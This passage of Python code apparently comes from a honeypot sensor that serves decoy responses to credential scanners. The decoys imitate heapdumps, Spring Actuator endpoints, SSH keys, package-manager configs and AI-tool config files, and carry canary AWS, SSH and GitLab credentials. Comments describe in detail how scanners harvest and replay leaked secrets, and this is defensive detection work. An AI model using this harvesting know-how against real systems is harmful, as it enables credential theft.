    # produces. Real heapdumps are megabytes; harvesters typically `grep`
    # the raw bytes for `AKIA…` / `AWS_SECRET_ACCESS_KEY` / `password=`
    # rather than parse HPROF, because Java string constants land as
    # contiguous UTF-8 in the dump.
    #
    # We emit a minimal HPROF-shaped header (magic + version + record
    # frames the dumb sniffers tolerate) followed by a long block of
    # plausible Java string constants — env var names, datasource URL,
    # and the canary AWS creds. Scanners that grep raw bytes harvest the
    # canary; scanners that try to parse HPROF strictly drop the response,
    # which is fine — the high-volume tools just grep.
    aws = _aws(r)
    db_password = _fake_db_password()
    # HPROF magic: "JAVA PROFILE 1.0.2\0" then a 4-byte ID size and a
    # 8-byte timestamp. Real parsers care about the record frames after
    # this; we skip those and put plaintext immediately, since byte-grep
    # tools don't validate frame structure.
    header = b"JAVA PROFILE 1.0.2\x00" + b"\x00\x00\x00\x08" + b"\x00\x00\x00\x00" * 2
    payload_strings = (
        "java.lang.System.getenv\n"
        "java.util.HashMap$Node\n"
        "spring.datasource.password\n"
        "spring.datasource.url\n"
        "AWS_ACCESS_KEY_ID\n"
        f"AWS_ACCESS_KEY_ID={aws.get('awsAccessKeyId', '')}\n"
        "AWS_SECRET_ACCESS_KEY\n"
        f"AWS_SECRET_ACCESS_KEY={aws.get('awsSecretAccessKey', '')}\n"
        "AWS_SESSION_TOKEN\n"
        f"AWS_SESSION_TOKEN={aws.get('awsSessionToken', '')}\n"
        "AWS_DEFAULT_REGION=us-east-1\n"
        f"jdbc:postgresql://prod_rw:{db_password}@db.internal:5432/prod\n"
        f"DB_PASSWORD={db_password}\n"
        "javax.management.ObjectName\n"
        "org.springframework.boot.actuate.endpoint.web.WebEndpointResponse\n"
        "org.apache.tomcat.util.net.SocketWrapperBase\n"
    ).encode("utf-8")
    # Pad to a few KB so the response doesn't look like a 200-byte stub
    # (real heapdumps are 50MB+; 8KB is enough to convince a content-length
    # filter without bloating sensor egress).
    return header + payload_strings + b"\x00" * (8192 - len(header) - len(payload_strings))


def render_actuator_configprops(r: dict[str, object]) -> bytes:
    # Spring Boot Actuator `/configprops` returns the resolved
    # @ConfigurationProperties beans — every `@ConfigurationProperties`
    # bean's prefix + properties values. On an unmasked actuator
    # (`management.endpoint.configprops.show-values=ALWAYS` or 1.x) the
    # raw `password` and `secret-key` values come back unredacted. The
    # JSON shape mirrors the `/configprops` response on Spring Boot 2.5+
    # (contexts → application → beans → <bean-name> → properties).
    aws = _aws(r)
    db_password = _fake_db_password()
    payload = {
        "contexts": {
            "application": {
                "beans": {
                    "spring.datasource-org.springframework.boot.autoconfigure.jdbc.DataSourceProperties": {
                        "prefix": "spring.datasource",
                        "properties": {
                            "url": "jdbc:postgresql://db.internal:5432/prod",
                            "username": "prod_rw",
                            "password": db_password,
                            "driverClassName": "org.postgresql.Driver",
                        },
                        "inputs": {
                            "url": {"value": "jdbc:postgresql://db.internal:5432/prod"},
                            "username": {"value": "prod_rw"},
                            "password": {"value": db_password},
                        },
                    },
                    "cloud.aws-org.springframework.cloud.aws.core.region.StaticRegionProvider": {
                        "prefix": "cloud.aws.credentials",
                        "properties": {
                            "accessKey": aws.get("awsAccessKeyId", ""),
                            "secretKey": aws.get("awsSecretAccessKey", ""),
                            "sessionToken": aws.get("awsSessionToken", ""),
                            "region": "us-east-1",
                        },
                        "inputs": {
                            "accessKey": {
                                "value": aws.get("awsAccessKeyId", ""),
                                "origin": 'System Environment Property "AWS_ACCESS_KEY_ID"',
                            },
                            "secretKey": {
                                "value": aws.get("awsSecretAccessKey", ""),
                                "origin": 'System Environment Property "AWS_SECRET_ACCESS_KEY"',
                            },
                        },
                    },
                    "management.endpoints.web-org.springframework.boot.actuate.autoconfigure.endpoint.web.WebEndpointProperties": {
                        "prefix": "management.endpoints.web",
                        "properties": {
                            "exposure": {"include": ["*"], "exclude": []},
                            "basePath": "/actuator",
                        },
                    },
                },
            },
        },
    }
    return json.dumps(payload, indent=2).encode("utf-8")


def render_actuator_health(r: dict[str, object]) -> bytes:
    # Spring Boot Actuator `/health` with `show-details=always` returns
    # component-level health for db / diskSpace / redis / kafka /
    # rabbitmq, including the JDBC URL on db.details.url. The URL on a
    # leaky deployment is the user-info-bearing form
    # `jdbc:postgresql://user:pass@host/db`, which is what a credential
    # harvester is grepping for.
    aws = _aws(r)
    db_password = _fake_db_password()
    payload = {
        "status": "UP",
        "components": {
            "db": {
                "status": "UP",
                "details": {
                    "database": "PostgreSQL",
                    "validationQuery": "isValid()",
                    "url": f"jdbc:postgresql://prod_rw:{db_password}@db.internal:5432/prod",
                },
            },
            "diskSpace": {
                "status": "UP",
                "details": {
                    "total": 107374182400,
                    "free": 73456328704,
                    "threshold": 10485760,
                    "exists": True,
                },
            },
            "ping": {"status": "UP"},
            "redis": {
                "status": "UP",
                "details": {
                    "version": "7.2.4",
                    "url": f"redis://:{_fake_db_password()}@cache.internal:6379/0",
                },
            },
            "s3": {
                "status": "UP",
                "details": {
                    "region": "us-east-1",
                    "bucket": "internal-tools-artifacts",
                    "accessKeyId": aws.get("awsAccessKeyId", ""),
                },
            },
        },
    }
    return json.dumps(payload, indent=2).encode("utf-8")


def render_actuator_mappings(r: dict[str, object]) -> bytes:
    # Spring Boot Actuator `/mappings` lists every `@RequestMapping` and
    # filter / handler. A scanner reading this looks for additional API
    # surface (admin/internal endpoints) and webhook URLs that often
    # carry secrets in the path or query (the AWS access key id is the
    # canary credential that gets surfaced via webhook URLs in the
    # response). Real responses are huge; we return a representative
    # subset with the scanner-interesting fields populated.
    aws = _aws(r)
    ak = aws.get("awsAccessKeyId", "")
    payload = {
        "contexts": {
            "application": {
                "mappings": {
                    "dispatcherServlets": {
                        "dispatcherServlet": [
                            {
                                "handler": "ResourceHttpRequestHandler [classpath:/static/]",
                                "predicate": "/**",
                                "details": None,
                            },
                            {
                                "handler": "com.internal.tools.api.WebhookController#receive(WebhookEvent)",
                                "predicate": f"{{POST /api/v1/webhook/{ak}/event}}",
                                "details": {
                                    "handlerMethod": {
                                        "className": "com.internal.tools.api.WebhookController",
                                        "name": "receive",
                                        "descriptor": "(Lcom/internal/tools/api/WebhookEvent;)Lorg/springframework/http/ResponseEntity;",
                                    },
                                    "requestMappingConditions": {
                                        "consumes": [{"mediaType": "application/json", "negated": False}],
                                        "headers": [],
                                        "methods": ["POST"],
                                        "params": [],
                                        "patterns": [f"/api/v1/webhook/{ak}/event"],
                                        "produces": [],
                                    },
                                },
                            },
                            {
                                "handler": "com.internal.tools.api.AdminController#listUsers()",
                                "predicate": "{GET /api/v1/admin/users}",
                                "details": {
                                    "requestMappingConditions": {
                                        "patterns": ["/api/v1/admin/users"],
                                        "methods": ["GET"],
                                    },
                                },
                            },
                            {
                                "handler": "org.springframework.boot.actuate.endpoint.web.servlet.WebMvcEndpointHandlerMapping",
                                "predicate": "/actuator/**",
                                "details": None,
                            },
                        ],
                    },
                    "servletFilters": [
                        {
                            "servletNameMappings": [],
                            "urlPatternMappings": ["/*"],
                            "name": "characterEncodingFilter",
                            "className": "org.springframework.boot.web.servlet.filter.OrderedCharacterEncodingFilter",
                        },
                    ],
                    "servlets": [
                        {
                            "mappings": ["/"],
                            "name": "dispatcherServlet",
                            "className": "org.springframework.web.servlet.DispatcherServlet",
                        },
                    ],
                },
            },
        },
    }
    return json.dumps(payload, indent=2).encode("utf-8")


def render_actuator_threaddump(r: dict[str, object]) -> bytes:
    # Spring Boot Actuator `/threaddump` returns Java thread state for
    # every live thread. Real thread names sometimes embed secrets when
    # an SDK pre-fills authentication context onto a worker thread name
    # (e.g. `s3-transfer-manager-worker-AKIA…-prod`). Harvesters grep
    # the response body for `AKIA` patterns the same way they grep
    # heapdumps.
    aws = _aws(r)
    ak = aws.get("awsAccessKeyId", "")
    sk = aws.get("awsSecretAccessKey", "")
    payload = {
        "threads": [
            {
                "threadName": "main",
                "threadId": 1,
                "blockedTime": -1,
                "blockedCount": 0,
                "waitedTime": -1,
                "waitedCount": 0,
                "lockName": None,
                "lockOwnerId": -1,
                "lockOwnerName": None,
                "daemon": False,
                "inNative": False,
                "suspended": False,
                "threadState": "RUNNABLE",
                "priority": 5,
                "stackTrace": [
                    {
                        "methodName": "park",
                        "fileName": "Unsafe.java",
                        "lineNumber": -2,
                        "className": "jdk.internal.misc.Unsafe",
                        "nativeMethod": True,
                    },
                    {
                        "methodName": "run",
                        "fileName": "ServerStartup.java",
                        "lineNumber": 88,
                        "className": "com.internal.tools.ServerStartup",
                        "nativeMethod": False,
                    },
                ],
                "lockedMonitors": [],
                "lockedSynchronizers": [],
            },
            {
                "threadName": f"s3-transfer-manager-worker-{ak}-prod",
                "threadId": 47,
                "blockedTime": -1,
                "blockedCount": 12,
                "waitedTime": -1,
                "waitedCount": 184,
                "daemon": True,
                "threadState": "WAITING",
                "priority": 5,
                "stackTrace": [],
                "lockedMonitors": [],
                "lockedSynchronizers": [],
            },
            {
                "threadName": "HikariPool-1 connection adder",
                "threadId": 52,
                "daemon": True,
                "threadState": "TIMED_WAITING",
                "priority": 5,
                "stackTrace": [
                    {
                        "methodName": "connect",
                        "fileName": "DataSource.java",
                        "lineNumber": 142,
                        "className": "com.zaxxer.hikari.pool.PoolBase",
                        "nativeMethod": False,
                    },
                ],
                "lockedMonitors": [
                    {
                        "className": "com.zaxxer.hikari.util.ConcurrentBag$IConcurrentBagEntry",
                        "identityHashCode": 1730124152,
                        "lockedStackDepth": 0,
                        "lockedStackFrame": {
                            "methodName": "borrow",
                            "fileName": "ConcurrentBag.java",
                            "lineNumber": 169,
                            "className": "com.zaxxer.hikari.util.ConcurrentBag",
                        },
                    },
                ],
                "lockedSynchronizers": [],
            },
            {
                "threadName": f"aws-sdk-credentials-refresher-{sk[:12] if sk else 'XXXXXXXXXXXX'}",
                "threadId": 61,
                "daemon": True,
                "threadState": "TIMED_WAITING",
                "priority": 5,
                "stackTrace": [],
                "lockedMonitors": [],
                "lockedSynchronizers": [],
            },
        ],
    }
    return json.dumps(payload, indent=2).encode("utf-8")


def render_phpinfo(r: dict[str, object]) -> bytes:
    aws = _aws(r)
    ak = aws.get("awsAccessKeyId", "")
    sk = aws.get("awsSecretAccessKey", "")
    st = aws.get("awsSessionToken", "")
    db_password = _fake_db_password()
    return (
        "<!DOCTYPE html>\n"
        "<html><head><title>phpinfo()</title>\n"
        "<style>body{background:#fff;color:#000;font-family:sans-serif}"
        "table{border-collapse:collapse;width:80%;margin:1em auto}"
        "th,td{border:1px solid #000;padding:4px 8px}"
        "h1{background:#9999cc;text-align:center}"
        "h2{background:#ccccff;margin-top:2em}</style></head><body>\n"
        "<h1>PHP Version 8.2.15</h1>\n"
        "<h2>Environment</h2>\n"
        "<table>\n"
        "<tr><th>Variable</th><th>Value</th></tr>\n"
        f"<tr><td>AWS_ACCESS_KEY_ID</td><td>{ak}</td></tr>\n"
        f"<tr><td>AWS_SECRET_ACCESS_KEY</td><td>{sk}</td></tr>\n"
        f"<tr><td>AWS_SESSION_TOKEN</td><td>{st}</td></tr>\n"
        "<tr><td>AWS_DEFAULT_REGION</td><td>us-east-1</td></tr>\n"
        "<tr><td>DB_HOST</td><td>db.internal</td></tr>\n"
        "<tr><td>DB_USER</td><td>prod_rw</td></tr>\n"
        f"<tr><td>DB_PASSWORD</td><td>{db_password}</td></tr>\n"
        "</table>\n"
        "<h2>Loaded Modules</h2>\n"
        "<p>core, date, libxml, openssl, pcre, sqlite3, zlib, ctype, curl, "
        "dom, fileinfo, filter, hash, iconv, json, mbstring, SPL, session, "
        "pdo_mysql, mysqlnd, ftp</p>\n"
        "</body></html>\n"
    ).encode("utf-8")


def _decode_ssh_value(raw: str) -> str:
    # Tracebit Community returns ``sshPrivateKey`` and ``sshPublicKey`` as
    # base64 over the on-wire JSON. If we serve the base64 verbatim to a
    # scanner on /id_rsa, ``ssh -i`` reads "invalid format" and no replay
    # ever fires the canary — which matches the dashboard reality of only
    # ~5 SSH canaries ever issued despite ~700 SSH-path hits/30d (attackers
    # fetch the "key", fail to use it, move on). Decode to the real PEM /
    # OpenSSH-authorized-keys string before serving. If the upstream format
    # changes back to raw PEM someday, a string starting with "-----BEGIN"
    # or "ssh-" base64-decodes to gibberish and UnicodeDecodeError bails
    # us out — fall back to serving the value as-is.
    if not raw:
        return ""
    try:
        decoded = base64.b64decode(raw, validate=True).decode("utf-8")
    except (ValueError, UnicodeDecodeError):
        return raw
    return decoded


def render_ssh_private_key(r: dict[str, object]) -> bytes:
    ssh = r.get("ssh") if isinstance(r, dict) else None
    if not isinstance(ssh, dict):
        return b""
    pk = _decode_ssh_value(str(ssh.get("sshPrivateKey", "") or ""))
    return (pk if pk.endswith("\n") else pk + "\n").encode("utf-8")


def render_ssh_public_key(r: dict[str, object]) -> bytes:
    ssh = r.get("ssh") if isinstance(r, dict) else None
    if not isinstance(ssh, dict):
        return b""
    pub = _decode_ssh_value(str(ssh.get("sshPublicKey", "") or ""))
    return (pub if pub.endswith("\n") else pub + "\n").encode("utf-8")


def render_authorized_keys(r: dict[str, object]) -> bytes:
    ssh = r.get("ssh") if isinstance(r, dict) else None
    if not isinstance(ssh, dict):
        return b""
    pub = _decode_ssh_value(str(ssh.get("sshPublicKey", "") or "")).strip()
    return (
        f"# production deploy keys — rotate via scripts/rotate-keys.sh\n"
        f"{pub}\n"
    ).encode("utf-8")


def render_ssh_config(r: dict[str, object]) -> bytes:
    # `~/.ssh/config` maps logical host aliases to real hosts + identity
    # files. Without this, a harvested /id_rsa is useless — the attacker
    # has no signal about which host accepts it. Tracebit's ssh canary
    # pairs the key with an ``sshIp``; pin the config to that IP and point
    # IdentityFile at the sibling /.ssh/id_rsa trap so an attacker running
    # ``ssh bastion`` fires the canary.
    ssh = r.get("ssh") if isinstance(r, dict) else None
    if not isinstance(ssh, dict):
        return b""
    ssh_ip = str(ssh.get("sshIp", "") or "")
    if not ssh_ip:
        return b""
    return (
        "Host bastion\n"
        f"    HostName {ssh_ip}\n"
        "    User root\n"
        "    IdentityFile ~/.ssh/id_rsa\n"
        "    IdentitiesOnly yes\n"
        "    ServerAliveInterval 60\n"
    ).encode("utf-8")


def render_known_hosts(r: dict[str, object]) -> bytes:
    # A real ``~/.ssh/known_hosts`` lists hosts the user has connected to,
    # each with the host key the ssh client saw on first contact. For our
    # purposes it's the second half of the IP↔key pairing: harvesters who
    # grab ``known_hosts`` alongside ``id_rsa`` learn which host the key
    # holder has SSH'd to — sshIp, where the Tracebit canary fires.
    ssh = r.get("ssh") if isinstance(r, dict) else None
    if not isinstance(ssh, dict):
        return b""
    ssh_ip = str(ssh.get("sshIp", "") or "")
    pub = _decode_ssh_value(str(ssh.get("sshPublicKey", "") or "")).strip()
    if not ssh_ip or not pub:
        return b""
    return f"{ssh_ip} {pub}\n".encode("utf-8")


def render_netrc(r: dict[str, object]) -> bytes:
    creds = _gitlab_creds(r, "gitlab-username-password").get("credentials") or {}
    if not isinstance(creds, dict):
        creds = {}
    username = str(creds.get("username", "") or "deploy")
    password = str(creds.get("password", "") or "")
    host_names = _gitlab_creds(r, "gitlab-username-password").get("hostNames") or []
    host = str(host_names[0]) if host_names else "gitlab.internal-tools.lan"
    return (
        f"machine {host}\n"
        f"  login {username}\n"
        f"  password {password}\n"
    ).encode("utf-8")


def render_git_credentials(r: dict[str, object]) -> bytes:
    """Render a Git credential-store file (`~/.git-credentials`).

    Format: one URL per line, userinfo-form — `https://user:pass@host`.
    Git writes this via `git config --global credential.helper store`.
    Scanners hunting for leaked `.git-credentials` read the file and try
    the embedded credentials against whichever host appears. We embed
    gitlab-username-password canaries (the same pairs used by /.netrc)
    so a hit against the gitlab host triggers the Tracebit callback.
    """
    creds = _gitlab_creds(r, "gitlab-username-password").get("credentials") or {}
    if not isinstance(creds, dict):
        creds = {}
    username = str(creds.get("username", "") or "deploy")
    password = str(creds.get("password", "") or "")
    host_names = _gitlab_creds(r, "gitlab-username-password").get("hostNames") or []
    host = str(host_names[0]) if host_names else "gitlab.internal-tools.lan"
    encoded_password = quote(password, safe="") if password else ""
    return (
        f"https://{username}:{encoded_password}@{host}\n"
    ).encode("utf-8")


def render_npmrc(r: dict[str, object]) -> bytes:
    creds = _gitlab_creds(r, "gitlab-username-password").get("credentials") or {}
    if not isinstance(creds, dict):
        creds = {}
    password = str(creds.get("password", "") or "")
    return (
        "registry=https://npm.internal-tools.lan/\n"
        f"//npm.internal-tools.lan/:_authToken={password}\n"
        "always-auth=true\n"
    ).encode("utf-8")


# --- Node.js dependency-manifest canary set ---------------------------------
# Scanners harvesting Node.js codebases pull /package.json, /package-lock.json,
# /yarn.lock, /.yarnrc, and /.yarnrc.yml together — yarn.lock + package-lock
# leak the resolved registry URL (which can carry an _authToken in the userinfo
# component on the wire), package.json names every internal dependency by
# package, and .yarnrc[.yml] holds the npmRegistryServer + npmAuthToken.
# Returning a coherent set with the same gitlab-username-password canary
# embedded in every URL means any one of the five files is enough to replay
# the token; pulling the whole set just gives the scanner more replay
# opportunities. Per-hit synthetic integrity hashes keep the lockfiles from
# turning into a fleet-wide fingerprint.
_NODE_DEPS_INTERNAL_HOST = "npm.internal-tools.lan"
_NODE_DEPS_PACKAGES: tuple[tuple[str, str], ...] = (
    # (package_name, version) — fixed identifiers (filler, not credentials).
    # Chosen to look like a small internal Node service: an Express API,
    # ORM, logger, internal auth client, internal feature-flag client.
    ("@internal-tools/auth-client", "2.4.1"),
    ("@internal-tools/feature-flags", "1.7.0"),
    ("@internal-tools/db-orm", "0.12.3"),
)


def _fake_npm_integrity() -> str:
    # npm/yarn lockfiles list a `sha512-<base64(sha512)>` integrity hash
    # per resolved tarball. A real value is the hash of the package
    # tarball; ours is a per-hit random sha512 so two adjacent sensors
    # don't ship the same literal across the fleet.
    digest = hashlib.sha512(secrets.token_bytes(32)).digest()
    return "sha512-" + base64.b64encode(digest).decode("ascii")


def _node_deps_canary_userinfo(r: dict[str, object]) -> tuple[str, str, str]:
    """Returns (username, password, internal_host). The password is the
    gitlab-username-password canary value when Tracebit returned one — that's
    the credential a scanner replays out of the resolved-URL userinfo. If the
    canary issuance failed the password falls back to a per-hit synthetic so
    we never ship a fixed literal across the fleet."""
    block = _gitlab_creds(r, "gitlab-username-password")
    creds = block.get("credentials") or {}
    if not isinstance(creds, dict):
        creds = {}
    username = str(creds.get("username", "") or "deploy")
    password = str(creds.get("password", "") or "") or _fake_db_password()
    return username, password, _NODE_DEPS_INTERNAL_HOST


def render_package_json(r: dict[str, object]) -> bytes:
    username, password, host = _node_deps_canary_userinfo(r)
    encoded_password = quote(password, safe="") if password else ""
    # `dependencies` mixes public packages (express, pino) with three
    # internal ones whose `git+https://` URL embeds the canary userinfo.
    # That URL is the high-signal piece — any scanner that strips it for
    # token replay trips Tracebit's gitlab-username-password callback.
    payload = {
        "name": "internal-tools-api",
        "version": "1.4.2",
        "private": True,
        "description": "internal tooling API",
        "main": "dist/server.js",
        "scripts": {
            "start": "node dist/server.js",
            "build": "tsc -p .",
            "test": "jest",
        },
        "dependencies": {
            "express": "^4.19.2",
            "pino": "^9.0.0",
            "pg": "^8.11.5",
            _NODE_DEPS_PACKAGES[0][0]: (
                f"git+https://{username}:{encoded_password}@{host}/internal/auth-client.git"
                f"#v{_NODE_DEPS_PACKAGES[0][1]}"
            ),
            _NODE_DEPS_PACKAGES[1][0]: f"^{_NODE_DEPS_PACKAGES[1][1]}",
            _NODE_DEPS_PACKAGES[2][0]: f"^{_NODE_DEPS_PACKAGES[2][1]}",
        },
        "devDependencies": {
            "typescript": "^5.4.5",
            "jest": "^29.7.0",
            "@types/node": "^20.12.7",
        },
        "publishConfig": {
            "registry": f"https://{host}/",
        },
        "repository": {
            "type": "git",
            "url": f"git+https://{host}/internal/internal-tools-api.git",
        },
    }
    return json.dumps(payload, indent=2).encode("utf-8")


def render_package_lock_json(r: dict[str, object]) -> bytes:
    username, password, host = _node_deps_canary_userinfo(r)
    encoded_password = quote(password, safe="") if password else ""
    auth_url = f"https://{username}:{encoded_password}@{host}"
    # npm package-lock.json v3 schema: top-level `packages` map keyed by
    # path. Each entry has `version`, `resolved`, `integrity`. The
    # `resolved` URL on every internal package carries the canary userinfo;
    # the integrity hash is per-hit synthetic so the lockfile body itself
    # isn't a cross-sensor literal.
    name = "internal-tools-api"
    pkgs: dict[str, dict[str, object]] = {
        "": {
            "name": name,
            "version": "1.4.2",
            "license": "UNLICENSED",
            "dependencies": {
                "express": "^4.19.2",
                "pino": "^9.0.0",
                "pg": "^8.11.5",
                _NODE_DEPS_PACKAGES[0][0]: f"git+{auth_url}/internal/auth-client.git",
                _NODE_DEPS_PACKAGES[1][0]: f"^{_NODE_DEPS_PACKAGES[1][1]}",
                _NODE_DEPS_PACKAGES[2][0]: f"^{_NODE_DEPS_PACKAGES[2][1]}",
            },
        },
    }
    for pkg_name, version in _NODE_DEPS_PACKAGES:
        pkgs[f"node_modules/{pkg_name}"] = {
            "version": version,
            "resolved": f"{auth_url}/{pkg_name}/-/{pkg_name.split('/')[-1]}-{version}.tgz",
            "integrity": _fake_npm_integrity(),
            "license": "UNLICENSED",
        }
    payload = {
        "name": name,
        "version": "1.4.2",
        "lockfileVersion": 3,
        "requires": True,
        "packages": pkgs,
    }
    return json.dumps(payload, indent=2).encode("utf-8")


def render_yarn_lock(r: dict[str, object]) -> bytes:
    username, password, host = _node_deps_canary_userinfo(r)
    encoded_password = quote(password, safe="") if password else ""
    auth_url = f"https://{username}:{encoded_password}@{host}"
    # yarn.lock v1 format. Each block is:
    #   "<name>@<range>":
    #     version "<resolved version>"
    #     resolved "<tarball-url>#<integrity>"
    #     integrity <integrity>
    lines: list[str] = [
        "# THIS IS AN AUTOGENERATED FILE. DO NOT EDIT THIS FILE DIRECTLY.\n",
        "# yarn lockfile v1\n",
        "\n",
    ]
    for pkg_name, version in _NODE_DEPS_PACKAGES:
        integrity = _fake_npm_integrity()
        tarball_basename = f"{pkg_name.split('/')[-1]}-{version}.tgz"
        resolved = f"{auth_url}/{pkg_name}/-/{tarball_basename}#{integrity}"
        lines.append(f'"{pkg_name}@^{version}":\n')
        lines.append(f'  version "{version}"\n')
        lines.append(f'  resolved "{resolved}"\n')
        lines.append(f"  integrity {integrity}\n")
        lines.append("\n")
    return "".join(lines).encode("utf-8")


def render_yarnrc(r: dict[str, object]) -> bytes:
    # Classic yarn v1 .yarnrc — key/value pairs, no YAML.
    _, password, host = _node_deps_canary_userinfo(r)
    return (
        f'registry "https://{host}/"\n'
        f'"//{host}/:_authToken" "{password}"\n'
        "always-auth true\n"
    ).encode("utf-8")


def render_yarnrc_yml(r: dict[str, object]) -> bytes:
    # Yarn berry (>=2) .yarnrc.yml — npmRegistryServer + npmAuthToken,
    # YAML-shaped. We hand-format because the file is tiny and we need
    # to keep it stdlib-only.
    _, password, host = _node_deps_canary_userinfo(r)
    return (
        f'npmRegistryServer: "https://{host}/"\n'
        f'npmAuthToken: "{password}"\n'
        "npmAlwaysAuth: true\n"
    ).encode("utf-8")


def render_pypirc(r: dict[str, object]) -> bytes:
    creds = _gitlab_creds(r, "gitlab-username-password").get("credentials") or {}
    if not isinstance(creds, dict):
        creds = {}
    username = str(creds.get("username", "") or "deploy")
    password = str(creds.get("password", "") or "")
    return (
        "[distutils]\n"
        "index-servers = internal\n"
        "\n"
        "[internal]\n"
        "repository = https://pypi.internal-tools.lan/\n"
        f"username = {username}\n"
        f"password = {password}\n"
    ).encode("utf-8")


def render_gitlab_api_user(r: dict[str, object]) -> bytes:
    creds = _gitlab_creds(r, "gitlab-username-password").get("credentials") or {}
    if not isinstance(creds, dict):
        creds = {}
    username = str(creds.get("username", "") or "deploy")
    return json.dumps({
        "id": 42,
        "username": username,
        "name": "Deploy Bot",
        "state": "active",
        "email": f"{username}@internal-tools.lan",
        "web_url": f"https://gitlab.internal-tools.lan/{username}",
        "is_admin": False,
        "two_factor_enabled": False,
    }, indent=2).encode("utf-8")


def render_gitlab_sign_in(r: dict[str, object]) -> bytes:
    # Body doesn't need the canary; just a plausible login page. The canary
    # goes out as Set-Cookie when we dispatch this trap (see _send_canary_trap).
    return (
        "<!DOCTYPE html>\n"
        "<html><head><title>Sign in &middot; GitLab</title></head>\n"
        "<body>\n"
        "<h1>GitLab</h1>\n"
        "<form method='POST' action='/users/sign_in'>\n"
        "<input name='authenticity_token' type='hidden' value='xxx' />\n"
        "<label>Username or email <input name='user[login]' /></label>\n"
        "<label>Password <input name='user[password]' type='password' /></label>\n"
        "<button type='submit'>Sign in</button>\n"
        "</form>\n"
        "<p><a href='/users/password/new'>Forgot your password?</a></p>\n"
        "</body></html>\n"
    ).encode("utf-8")


# --- AI credential config files (/.openai/config.json, etc.) -------------
#
# Scanner fleets were observed probing `/.openai/config.json`,
# `/.anthropic/config.json`, and `/.cursor/mcp.json` in mid-April 2026 —
# looking for harvestable LLM provider credentials — and appeared to be
# absorbed into standard env-hunter dictionaries shortly after debut.
#
# **This trap probably doesn't make sense yet, and we're shipping it
# anyway.** Tracebit Community only exposes `aws`, `ssh`,
# `gitlab-username-password`, and `gitlab-cookie` canary types today — no
# OpenAI/Anthropic/LLM type. The renderers below therefore dress an AWS
# canary in OpenAI/Anthropic/Cursor-shaped JSON. A grep-based scanner that
# only cares about the field names (`api_key`, `auth_token`) will still
# serialize the value and ship it to its exfil endpoint; a scanner that
# filters by the `sk-...` / `sk-ant-...` key-format prefix will correctly
# decide the key is fake and drop it. Either way we still log the probe,
# which is the primary intel for now.
#
# When Tracebit ships LLM canary types (hinted at in their marketing), swap
# the renderers below over and the trap becomes genuinely trippable.


def render_openai_config_json(r: dict[str, object]) -> bytes:
    # Official OpenAI clients don't actually use `~/.openai/config.json` —
    # the path is a common misconfiguration / leaked-env-var convention,
    # which is why scanners grep for it. We emit a shape that matches what
    # several third-party OpenAI wrapper libs document.
    aws = _aws(r)
    return json.dumps({
        "organization": "org-internal-tools",
        "api_key": aws.get("awsAccessKeyId", ""),
        "api_secret": aws.get("awsSecretAccessKey", ""),
        "session_token": aws.get("awsSessionToken", ""),
        "base_url": "https://api.openai.com/v1",
        "default_model": "gpt-4o-mini",
    }, indent=2).encode("utf-8")


def render_anthropic_config_json(r: dict[str, object]) -> bytes:
    # Same caveat as render_openai_config_json: Anthropic's official SDK
    # doesn't use a config.json, but scanner dictionaries include this path
    # because leaked env files + third-party wrappers often do.
    aws = _aws(r)
    return json.dumps({
        "auth_token": aws.get("awsAccessKeyId", ""),
        "api_key": aws.get("awsSecretAccessKey", ""),
        "session_token": aws.get("awsSessionToken", ""),
        "base_url": "https://api.anthropic.com",
        "default_model": "claude-3-5-sonnet-20241022",
    }, indent=2).encode("utf-8")


def render_cursor_mcp_json(r: dict[str, object]) -> bytes:
    # Cursor's Model Context Protocol config — can contain API keys and
    # tokens passed as env vars to spawned MCP servers. We embed the canary
    # as the auth material on two plausible MCP server entries.
    aws = _aws(r)
    return json.dumps({
        "mcpServers": {
            "github": {
                "command": "npx",
                "args": ["-y", "@modelcontextprotocol/server-github"],
                "env": {
                    "GITHUB_PERSONAL_ACCESS_TOKEN": aws.get("awsAccessKeyId", ""),
                },
            },
            "internal-tools": {
                "command": "uvx",
                "args": ["--from", "internal-tools-mcp", "serve"],
                "env": {
                    "API_KEY": aws.get("awsSecretAccessKey", ""),
                    "SESSION_TOKEN": aws.get("awsSessionToken", ""),
                    "BASE_URL": "https://tools.internal.lan",
                },
            },
        },
    }, indent=2).encode("utf-8")


# --- AI editor / coding-assistant config files (expansion) ---------------
#
# Scanner dictionaries spotted in late-April 2026 broadened from the
# `/.openai/config.json` / `/.anthropic/config.json` / `/.cursor/mcp.json`
# / `/.claude/.credentials.json` set above to a much wider AI-developer
# tooling surface — Cline, Continue.dev, Aider, Open-Interpreter, Cody,
# generic MCP catch-alls, Streamlit secrets, LiteLLM proxy, LangSmith,
# HuggingFace tokens, and a long tail of small-name code assistants.
# All renderers below dress an AWS Tracebit canary in the relevant
# tool's documented config shape — same caveat as the original four:
# Tracebit Community has no LLM canary type yet, so a key-format
# (`sk-ant-...`, `hf_...`) prefix filter will drop the value as
# obviously-fake. A field-name harvester (`api_key`, `apiKey`,
# `accessToken`, `OPENAI_API_KEY`) will still serialize and ship,
# tripping the AWS canary on replay. The probe is the primary intel.


def render_claude_settings_json(r: dict[str, object]) -> bytes:
    # Claude Desktop / Claude Code `~/.claude/settings.json`. Distinct from
    # `.credentials.json` (OAuth tokens): this file holds MCP server
    # definitions + provider API key + permissions.
    aws = _aws(r)
    return json.dumps({
        "model": "claude-3-5-sonnet-20241022",
        "apiKey": aws.get("awsSecretAccessKey", ""),
        "anthropicApiKey": aws.get("awsAccessKeyId", ""),
        "permissions": {
            "allow": ["Bash(git:*)", "Read", "Write"],
            "deny": [],
        },
        "mcpServers": {
            "github": {
                "command": "npx",
                "args": ["-y", "@modelcontextprotocol/server-github"],
                "env": {
                    "GITHUB_PERSONAL_ACCESS_TOKEN": aws.get("awsAccessKeyId", ""),
                },
            },
            "internal-tools": {
                "command": "uvx",
                "args": ["--from", "internal-tools-mcp", "serve"],
                "env": {
                    "API_KEY": aws.get("awsSessionToken", ""),
                    "BASE_URL": "https://tools.internal.lan",
                },
            },
        },
    }, indent=2).encode("utf-8")


def render_cline_settings_json(r: dict[str, object]) -> bytes:
    # Cline (VS Code extension) settings file. Provider + API key +
    # model id at the top level; MCP servers nested.
    aws = _aws(r)
    return json.dumps({
        "apiProvider": "anthropic",
        "apiKey": aws.get("awsSecretAccessKey", ""),
        "apiModelId": "claude-3-5-sonnet-20241022",
        "openAiApiKey": aws.get("awsAccessKeyId", ""),
        "openRouterApiKey": aws.get("awsSessionToken", ""),
        "alwaysAllowReadOnly": False,
    }, indent=2).encode("utf-8")


def render_continue_config_json(r: dict[str, object]) -> bytes:
